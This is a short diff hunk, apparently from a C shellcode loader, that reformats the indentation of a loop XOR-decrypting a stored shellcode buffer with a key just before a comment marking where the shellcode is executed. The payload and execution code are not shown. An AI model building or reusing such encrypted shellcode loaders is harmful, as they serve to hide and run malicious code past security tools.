@@ -55,10 +55,10 @@ int main(int argc, char* argv[]) {
 	int i = 0;
 	unsigned char shellcode[sizeof(buf)];
 	for (int x=0; x < sizeof(buf); x++) {
-        if (i == sizeof(key)-1) i = 0;
-        shellcode[x] = buf[x] ^ key[i];
-        i++;
-    }
+		if (i == sizeof(key)-1) i = 0;
+		shellcode[x] = buf[x] ^ key[i];
+		i++;
+	}
 	printf("[*] Shellcode Decrypted using stored key.\n")
 	
 	// Execute shellcode
